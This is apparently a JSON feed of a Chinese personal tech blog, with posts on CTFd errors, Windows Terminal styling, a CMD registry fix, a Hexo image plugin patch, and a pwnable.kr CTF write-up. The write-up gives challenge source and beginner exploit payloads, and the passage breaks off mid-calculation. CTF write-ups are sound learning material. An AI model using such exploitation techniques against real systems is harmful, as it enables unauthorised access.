punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected <span class=\"token number\">144</span> from C header, got <span class=\"token number\">152</span> from PyObject</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token builtin class-name\">return</span> f<span class=\"token punctuation\">(</span>*args, **kwds<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:30 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Starting gunicorn <span class=\"token number\">19.9</span>.0</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:30 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Listening at: http://0.0.0.0:8000 <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:30 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Using worker: gevent</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:30 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:31 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:32 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:34 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:35 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:36 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:37 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:39 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">2020</span>-10-11 <span class=\"token number\">12</span>:31:40 +0000<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>INFO<span class=\"token punctuation\">]</span> Booting worker with pid: <span class=\"token number\">37</span><span class=\"token punctuation\">(</span>一直在加<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>删除 requirements.txt 中 gevent 的版本号。</p>\n<h2 id=\"无法更新ctfd-whale配置\"><a class=\"anchor\" href=\"#无法更新ctfd-whale配置\">#</a> 无法更新 ctfd-whale 配置</h2>\n<p>这个问题很奇怪，我只遇到过一次，然后放了一晚上之后他就好了</p>\n<p>所以，解决方法是，建议重启 docker</p>\n",
            "tags": [
                "杂记",
                "CTF"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/Terminal%E5%AE%89%E8%A3%85+%E7%BE%8E%E5%8C%96/",
            "url": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/Terminal%E5%AE%89%E8%A3%85+%E7%BE%8E%E5%8C%96/",
            "title": "Terminal安装+美化",
            "date_published": "2022-05-25T07:48:26.000Z",
            "content_html": "<p>#Terminal</p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>Powershell 这体验着实是不行，乱码，颜色无法显示。是时候该换 Windows Terminal 了</p>\n<h1 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> 安装</h1>\n<h2 id=\"github安装\"><a class=\"anchor\" href=\"#github安装\">#</a> Github 安装</h2>\n<p>下载页面<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC90ZXJtaW5hbC9yZWxlYXNlcw==\"> Github</span>，下载下来安装就可以了，值得注意的是，如果从 GitHub 安装，终端将不会自动更新为新版本。</p>\n<h2 id=\"microsoft-store安装推荐\"><a class=\"anchor\" href=\"#microsoft-store安装推荐\">#</a> Microsoft Store 安装（推荐）</h2>\n<p>直接在开始菜单中打开 Microsoft Store，搜索 Windows Terminal，安装即可</p>\n<h1 id=\"美化\"><a class=\"anchor\" href=\"#美化\">#</a> 美化</h1>\n<p>虽然刚安装好的 Terminal 看起来还可以，不过还是不够美观，继续优化</p>\n<h2 id=\"powerline\"><a class=\"anchor\" href=\"#powerline\">#</a> Powerline</h2>\n<p>Powerline 提供自定义的命令提示符体验，提供 Git 状态颜色编码和提示符。</p>\n<h3 id=\"安装字体\"><a class=\"anchor\" href=\"#安装字体\">#</a> 安装字体</h3>\n<p>安装 Powerline 字体，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC9jYXNjYWRpYS1jb2RlL3JlbGVhc2Vz\">Github 下载</span></p>\n<h3 id=\"安装posh-git-和-oh-my-posh\"><a class=\"anchor\" href=\"#安装posh-git-和-oh-my-posh\">#</a> 安装 Posh-Git 和 Oh-My-Posh</h3>\n<p>打开 Powershell，执行下列命令，执行途中全部选 Yes</p>\n<p>Install-Module posh-git -Scope CurrentUser<br />\nInstall-Module oh-my-posh -Scope CurrentUser</p>\n<h3 id=\"自定义-powershell-提示符\"><a class=\"anchor\" href=\"#自定义-powershell-提示符\">#</a> 自定义 PowerShell 提示符</h3>\n<p>找到 Powershell 的配置文件，当前用户的配置文件位置在 <code>C:\\Users\\用户名\\Documents\\WindowsPowerShell\\</code> , 一般叫 <code>profile.ps1</code>  或者 <code>Microsoft.PowerShell_profile.ps1</code> ，打开配置文件，将以下内容添加到末尾：</p>\n<p>Import-Module posh-git<br />\nImport-Module oh-my-posh<br />\nSet-Theme Paradox</p>\n<h3 id=\"设置字体\"><a class=\"anchor\" href=\"#设置字体\">#</a> 设置字体</h3>\n<p>打开 Windows Terminal 的配置文件，找到 Powershell 的配置，即 <code>name</code>  为 <code>Windows PowerShell</code>  的项，添加 <code>&quot;fontFace&quot;: &quot;Cascadia Code PL&quot;</code> ，这样就大功告成了。</p>\n<h2 id=\"配色方案以及背景\"><a class=\"anchor\" href=\"#配色方案以及背景\">#</a> 配色方案以及背景</h2>\n<p>这里就直接放上配置文件了</p>\n<p>{<br />\n&quot;$schema&quot;: &quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ha2EubXMvdGVybWluYWwtcHJvZmlsZXMtc2NoZW1h\">https://aka.ms/terminal-profiles-schema</span>&quot;,<br />\n&quot;defaultProfile&quot;: &quot;{61c54bbd-c2c6-5271-96e7-009a87ff44bf}&quot;,</p>\n<pre><code>// 全局配置\n// 关闭多个选项卡时是否需要确认\n&quot;confirmCloseAllTabs&quot;: false,\n// 主题\n&quot;theme&quot;:&quot;dark&quot;,\n// If enabled, selections are automatically copied to your clipboard.\n&quot;copyOnSelect&quot;: false,\n// If enabled, formatted data is also copied to your clipboard\n&quot;copyFormatting&quot;: false,\n// 配置文件\n&quot;profiles&quot;:\n&#123;\n    &quot;defaults&quot;:\n    &#123;\n        // Put settings here that you want to apply to all profiles.\n        // 配色方案\n        &quot;colorScheme&quot;: &quot;Gruvbox Dark&quot;,\n        // 指针样式\n        &quot;cursorShape&quot;: &quot;vintage&quot;\n    &#125;,\n    &quot;list&quot;:\n    [\n        &#123;\n            // Powershell配置\n            &quot;guid&quot;: &quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;,\n            &quot;name&quot;: &quot;Windows PowerShell&quot;,\n            &quot;commandline&quot;: &quot;powershell.exe&quot;,\n            // 启动时位置\n            &quot;startingDirectory&quot;: &quot;D:/&quot;,\n            // 字体\n            &quot;fontFace&quot;: &quot;Cascadia Code PL&quot;,\n            // 启用 acrylic 背景，这里自行调整\n            &quot;useAcrylic&quot;: true,\n            // 设置 Acrylic 不透明度\n            &quot;acrylicOpacity&quot;: 0.5,\n            // 背景图片\n            &quot;backgroundImage&quot;: &quot;背景图片位置&quot;,\n            // 背景图片不透明度\n            &quot;backgroundImageOpacity&quot;:0.6,\n            &quot;hidden&quot;: false\n        &#125;,\n        &#123;\n            // cmd配置\n            &quot;guid&quot;: &quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;,\n            &quot;name&quot;: &quot;命令提示符&quot;,\n            &quot;commandline&quot;: &quot;cmd.exe&quot;,\n            &quot;hidden&quot;: false\n        &#125;,\n        &#123;\n            &quot;guid&quot;: &quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;,\n            &quot;hidden&quot;: false,\n            &quot;name&quot;: &quot;Azure Cloud Shell&quot;,\n            &quot;source&quot;: &quot;Windows.Terminal.Azure&quot;\n        &#125;\n    ]\n&#125;,\n// 配色方案\n&quot;schemes&quot;: [\n    &#123;\n        &quot;name&quot;: &quot;Gruvbox Dark&quot;,\n        &quot;black&quot;: &quot;#1e1e1e&quot;,\n        &quot;red&quot;: &quot;#be0f17&quot;,\n        &quot;green&quot;: &quot;#868715&quot;,\n        &quot;yellow&quot;: &quot;#cc881a&quot;,\n        &quot;blue&quot;: &quot;#377375&quot;,\n        &quot;purple&quot;: &quot;#a04b73&quot;,\n        &quot;cyan&quot;: &quot;#578e57&quot;,\n        &quot;white&quot;: &quot;#978771&quot;,\n        &quot;brightBlack&quot;: &quot;#7f7061&quot;,\n        &quot;brightRed&quot;: &quot;#f73028&quot;,\n        &quot;brightGreen&quot;: &quot;#aab01e&quot;,\n        &quot;brightYellow&quot;: &quot;#f7b125&quot;,\n        &quot;brightBlue&quot;: &quot;#719586&quot;,\n        &quot;brightPurple&quot;: &quot;#c77089&quot;,\n        &quot;brightCyan&quot;: &quot;#7db669&quot;,\n        &quot;brightWhite&quot;: &quot;#e6d4a3&quot;,\n        &quot;background&quot;: &quot;#1e1e1e&quot;,\n        &quot;foreground&quot;: &quot;#e6d4a3&quot;\n    &#125;\n],\n// Add custom keybindings to this array.\n// To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.\n// To learn more about keybindings, visit https://aka.ms/terminal-keybindings\n&quot;keybindings&quot;:\n[\n    // Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.\n    // These two lines additionally bind them to Ctrl+C and Ctrl+V.\n    // To learn more about selection, visit https://aka.ms/terminal-selection\n    &#123; &quot;command&quot;: &#123;&quot;action&quot;: &quot;copy&quot;, &quot;singleLine&quot;: false &#125;, &quot;keys&quot;: &quot;ctrl+c&quot; &#125;,\n    &#123; &quot;command&quot;: &quot;paste&quot;, &quot;keys&quot;: &quot;ctrl+v&quot; &#125;,\n    // Press Ctrl+Shift+F to open the search box\n    &#123; &quot;command&quot;: &quot;find&quot;, &quot;keys&quot;: &quot;ctrl+shift+f&quot; &#125;,\n    // Press Alt+Shift+D to open a new pane.\n    // - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.\n    // - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane's profile.\n    // To learn more about panes, visit https://aka.ms/terminal-panes\n    &#123; &quot;command&quot;: &#123; &quot;action&quot;: &quot;splitPane&quot;, &quot;split&quot;: &quot;auto&quot;, &quot;splitMode&quot;: &quot;duplicate&quot; &#125;, &quot;keys&quot;: &quot;alt+shift+d&quot; &#125;\n]\n</code></pre>\n<p>}</p>\n<h1 id=\"最终效果\"><a class=\"anchor\" href=\"#最终效果\">#</a> 最终效果</h1>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153212576-1418edf9-4933-4a4f-a6e6-3e1772744a97.png\" alt=\"\" /></p>\n<p>舒服了</p>\n",
            "tags": [
                "杂记",
                "Terminal"
            ]
        },
        {
            "id": "https://a1oyss.github.io/BUG/%E8%BF%90%E8%A1%8CCMD%E6%8F%90%E7%A4%BA[%E5%B7%B2%E9%80%80%E5%87%BA%E8%BF%9B%E7%A8%8B%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%B8%BA%201]%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/",
            "url": "https://a1oyss.github.io/BUG/%E8%BF%90%E8%A1%8CCMD%E6%8F%90%E7%A4%BA[%E5%B7%B2%E9%80%80%E5%87%BA%E8%BF%9B%E7%A8%8B%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%B8%BA%201]%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/",
            "title": "运行CMD提示[已退出进程，代码为 1]解决方案",
            "date_published": "2021-05-27T02:25:33.000Z",
            "content_html": "<p>今天准备使用 npm 时遇到了这个问题，npm install 没有反应，npm 也没反应，但是 nvm 确确实实是有安装好 nodejs 的。</p>\n<p>然后一步步找，突然看到 windows 下的 npm 命令是调用 npm.cmd</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2658344/1622081898067-f4afff9f-cbdd-4099-8f5a-52377ffc6fd1.png#align=left&amp;display=inline&amp;height=100&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=200&amp;originWidth=559&amp;size=17226&amp;status=done&amp;style=none&amp;width=279.5\" alt=\"image.png\" /></p>\n<p>接着就试着直接运行，发现一个黑框一闪而过。</p>\n<p>然后再尝试打开 cmd，也是一个黑框一闪而过，感觉问题应该就是出在这。</p>\n<p>使用 windows terminal 打开 cmd，结果就出现了</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2658344/1622082027615-7a316adb-8f69-4aa8-9f7c-21c68a935138.png#align=left&amp;display=inline&amp;height=108&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=216&amp;originWidth=754&amp;size=13853&amp;status=done&amp;style=none&amp;width=377\" alt=\"image.png\" /></p>\n<p>网上搜索到的注册表，gpedit，全都没有效果，后来直接去 stackoverflow 搜，找到了一个看起来很像的帖子：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNjYzMzUzMDAvY21kLWNyYXNoZXMtd2l0aC1leGl0LWNvZGUtMS1hZnRlci11bmluc3RhbGxpbmctYW5hY29uZGEv\">https://stackoverflow.com/questions/66335300/cmd-crashes-with-exit-code-1-after-uninstalling-anaconda/</span></p>\n<p>看到后面有个 anaconda，突然想起来之前我好像也装过一次，帖子描述也和我一样：</p>\n<p>直接打开 cmd 无效，但是从 powershell 中打开 cmd /d 就可以正常进入。</p>\n<p>下面给出了一条解决方法：</p>\n<pre><code>\nC:\\Windows\\System32\\reg.exe DELETE &quot;HKCU\\Software\\Microsoft\\Command Processor&quot; /v AutoRun /f\n\n</code></pre>\n<p>使用其他终端运行命令后，问题解决。</p>\n",
            "tags": [
                "BUG",
                "BUG"
            ]
        },
        {
            "id": "https://a1oyss.github.io/BUG/Hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E5%A4%B1%E8%B4%A5/",
            "url": "https://a1oyss.github.io/BUG/Hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E5%A4%B1%E8%B4%A5/",
            "title": "Hexo图片显示失败",
            "date_published": "2021-03-27T16:09:09.000Z",
            "content_html": "<p>#Hexo</p>\n<h1 id=\"part-1\"><a class=\"anchor\" href=\"#part-1\">#</a> Part 1</h1>\n<p>今天提交文章的时候，上去博客看了一眼，发现图片全都显示不出来，</p>\n<p>看了下图片 url，全都是</p>\n<p>file://image/123.jpg</p>\n<p>这种形式的。</p>\n<p>因为我使用的 typora 来写 markdown，自动插入图片默认的是本地路径，去设置里更改为使用相对路径即可</p>\n<h1 id=\"part-2\"><a class=\"anchor\" href=\"#part-2\">#</a> part 2</h1>\n<p>原本以为大功告成，结果发现还是显示错误，去网上查了下，有些插件没有装，_config.yml 里的选项也没有开。。。</p>\n<p>安装 <code>hexo-asset-image</code></p>\n<p>npm install <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NvZGVGYWxsaW5nL2hleG8tYXNzZXQtaW1hZ2U=\">https://github.com/CodeFalling/hexo-asset-image</span> --save</p>\n<p>_config.yml 配置</p>\n<p><code>post_asset_folder: false</code>  改为 <code>post_asset_folder: true</code></p>\n<h1 id=\"part-3\"><a class=\"anchor\" href=\"#part-3\">#</a> part 3</h1>\n<p>再次以为大功告成，结果发现还是错误，之前 <code>hexo g -d</code>  的时候没有注意，这次执行的时候突然发现有几条记录有点奇怪</p>\n<p>update link as:--&gt;/.io//06/01/vim/1561905818946.png<br />\nupdate link as:--&gt;/.io//06/01/vim/1561905818946.png</p>\n<p>这个 <code>.io</code>  不知道是怎么来的，不管怎么修改图片的路径，这个 <code>.io</code>  总是有</p>\n<p>最终查来查去发现是 <code>hexo-asset-image</code>  这个插件的问题，hexo 3.0 以上与 hexo 3.0 以下获取 url 的方式不同，结果就导致获取到了 <code>.io</code>  这种奇怪的域名。</p>\n<h1 id=\"解决问题\"><a class=\"anchor\" href=\"#解决问题\">#</a> 解决问题</h1>\n<p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hqbTg1MDU1MjU4Ni9hcnRpY2xlL2RldGFpbHMvODQxMDEzNDU=\"> hexo 引用本地图片无法显示</span></p>\n<p>将 <code>/node_modules/hexo-asset-image/index.js</code>  里面的内容修改为</p>\n<p>'use strict';<br />\nvar cheerio = require('cheerio');</p>\n<p>// <span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xNDQ4MDM0NS9ob3ctdG8tZ2V0LXRoZS1udGgtb2NjdXJyZW5jZS1pbi1hLXN0cmluZw==\">http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><br />\nfunction getPosition(str, m, i) {<br />\nreturn str.split(m, i).join(m).length;<br />\n}</p>\n<p>var version = String(hexo.version).split('.');<br />\nhexo.extend.filter.register('after_post_render', function(data){<br />\nvar config = hexo.config;<br />\nif(config.post_asset_folder){<br />\nvar link = data.permalink;<br />\nif(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3)<br />\nvar beginPos = getPosition(link, '/', 1) + 1;<br />\nelse<br />\nvar beginPos = getPosition(link, '/', 3) + 1;<br />\n// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.<br />\nvar endPos = link.lastIndexOf('/') + 1;<br />\nlink = link.substring(beginPos, endPos);</p>\n<pre><code>var toprocess = ['excerpt', 'more', 'content'];\nfor(var i = 0; i &lt; toprocess.length; i++)&#123;\n  var key = toprocess[i];\n\n  var $ = cheerio.load(data[key], &#123;\n    ignoreWhitespace: false,\n    xmlMode: false,\n    lowerCaseTags: false,\n    decodeEntities: false\n  &#125;);\n\n  $('img').each(function()&#123;\n\tif ($(this).attr('src'))&#123;\n\t\t// For windows style path, we replace '\\' to '/'.\n\t\tvar src = $(this).attr('src').replace('\\\\', '/');\n\t\tif(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp;\n\t\t   !/^\\s*\\//.test(src)) &#123;\n\t\t  // For &quot;about&quot; page, the first part of &quot;src&quot; can't be removed.\n\t\t  // In addition, to support multi-level local directory.\n\t\t  var linkArray = link.split('/').filter(function(elem)&#123;\n\t\t\treturn elem != '';\n\t\t  &#125;);\n\t\t  var srcArray = src.split('/').filter(function(elem)&#123;\n\t\t\treturn elem != '' &amp;&amp; elem != '.';\n\t\t  &#125;);\n\t\t  if(srcArray.length &gt; 1)\n\t\t\tsrcArray.shift();\n\t\t  src = srcArray.join('/');\n\t\t  $(this).attr('src', config.root + link + src);\n\t\t  console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);\n\t\t&#125;\n\t&#125;else&#123;\n\t\tconsole.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);\n\t\tconsole.info&amp;&amp;console.info($(this));\n\t&#125;\n  &#125;);\n  data[key] = $.html();\n&#125;\n</code></pre>\n<p>}<br />\n});</p>\n<p>接着再去 <code>hexo g -d</code>  一下就能显示成功了。</p>\n<p>hexo 3.0 以上用户应该也可以选择直接卸载 <code>hexo-asset-image</code>  插件，直接使用官方的 <code>相对路径引用的标签插件</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3MvYXNzZXQtZm9sZGVycy5odG1s\">资源文件夹</span></p>\n<p>通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在 Hexo 2 时代，社区创建了很多插件来解决这个问题。但是，随着 Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。</p>\n<p><code>&#123;% asset_path slug %&#125;</code></p>\n<p><code>&#123;% asset_img slug [title] %&#125;</code></p>\n<p><code>&#123;% asset_link slug [title] %&#125;</code></p>\n<p>比如说：当你打开文章资源文件夹功能后，你把一个  <code>example.jpg</code>  图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法  <code>![](/example.jpg)</code>  ，它将 <em>不会</em> 出现在首页上。（但是它会在文章中按你期待的方式工作）</p>\n<p>正确的引用图片方式是使用下列的标签插件而不是 markdown ：</p>\n<p><code>&#123;% asset_img example.jpg This is an example image %&#125;</code></p>\n<p>通过这种方式，图片将会同时出现在文章和主页以及归档页中。</p>\n",
            "tags": [
                "BUG",
                "Hexo"
            ]
        },
        {
            "id": "https://a1oyss.github.io/CTF/Pwnable%E9%A2%98%E8%A7%A3/",
            "url": "https://a1oyss.github.io/CTF/Pwnable%E9%A2%98%E8%A7%A3/",
            "title": "Pwnable题解",
            "date_published": "2020-12-23T03:11:41.000Z",
            "content_html": "<p>#CTF #PWN</p>\n<h1 id=\"toddlers-bottle\"><a class=\"anchor\" href=\"#toddlers-bottle\">#</a> Toddler's Bottle</h1>\n<h2 id=\"fd\"><a class=\"anchor\" href=\"#fd\">#</a> fd</h2>\n<h3 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h3>\n<p>Mommy! what is a file descriptor in Linux?</p>\n<ul>\n<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly95b3V0dS5iZS85NzFlWmhNSFFRdw==\">https://youtu.be/971eZhMHQQw</span></li>\n</ul>\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmZkQHB3bmFibGUua3I=\">fd@pwnable.kr</span> -p2222 (pw:guest)</p>\n<h3 id=\"题目解析\"><a class=\"anchor\" href=\"#题目解析\">#</a> 题目解析</h3>\n<p>先了解下 fd 是什么东西</p>\n<p>fd (file descriptor)，文件描述符</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODYlODUlRTYlQTAlQjgvMTA4NDEw\">内核</span>（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>\n<p>习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。</p>\n<p>ssh 连接上题目，查看题目代码</p>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\n#include &lt;string.h&gt;<br />\nchar buf[32];<br />\nint main(int argc, char* argv[], char* envp[]){<br />\nif(argc&lt;2){<br />\nprintf(&quot;pass argv[1] a number\\n&quot;);<br />\nreturn 0;<br />\n}<br />\nint fd = atoi( argv[1] ) - 0x1234;<br />\nint len = 0;<br />\nlen = read(fd, buf, 32);<br />\nif(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){<br />\nprintf(&quot;good job 😃\\n&quot;);<br />\nsystem(&quot;/bin/cat flag&quot;);<br />\nexit(0);<br />\n}<br />\nprintf(&quot;learn about Linux file IO\\n&quot;);<br />\nreturn 0;</p>\n<p>}</p>\n<p>令 fd 为 0 (stdin)，再输入 LETMEWIN 就可以得到 flag。</p>\n<p><strong>payload</strong></p>\n<p>./fd 4660<br />\ninput：LETMEWIN</p>\n<h2 id=\"collision\"><a class=\"anchor\" href=\"#collision\">#</a> collision</h2>\n<h3 id=\"题目描述-2\"><a class=\"anchor\" href=\"#题目描述-2\">#</a> 题目描述</h3>\n<p>Daddy told me about cool MD5 hash collision today.</p>\n<p>I wanna do something like that too!</p>\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmNvbEBwd25hYmxlLmty\">col@pwnable.kr</span> -p2222 (pw:guest)</p>\n<h3 id=\"题目解析-2\"><a class=\"anchor\" href=\"#题目解析-2\">#</a> 题目解析</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;<br />\nunsigned long hashcode = 0x21DD09EC;<br />\nunsigned long check_password(const char* p){<br />\nint* ip = (int*)p;<br />\nint i;<br />\nint res=0;<br />\nfor(i=0; i&lt;5; i++){<br />\nres += ip[i];<br />\n}<br />\nreturn res;<br />\n}</p>\n<p>int main(int argc, char* argv[]){<br />\nif(argc&lt;2){<br />\nprintf(&quot;usage:%s [passcode]\\n&quot;, argv[0]);<br />\nreturn 0;<br />\n}<br />\nif(strlen(argv[1]) != 20){<br />\nprintf(&quot;passcode length should be 20 bytes\\n&quot;);<br />\nreturn 0;<br />\n}</p>\n<pre><code>    if(hashcode == check_password( argv[1] ))&#123;\n            system(&quot;/bin/cat flag&quot;);\n            return 0;\n    &#125;\n    else\n            printf(&quot;wrong passcode.\\n&quot;);\n    return 0;\n</code></pre>\n<p>}</p>\n<p><code>check_password</code>  将 <code>char*</code>  强制转换为 <code>int*</code> ，也就是将输入的数据分为 4 个字节一组，5 组数据相加最后的结果要等于 <code>0x21DD09EC</code></p>\n<p><code>0x21DD09EC/5 = 0x6C5CEC9 * 4 + 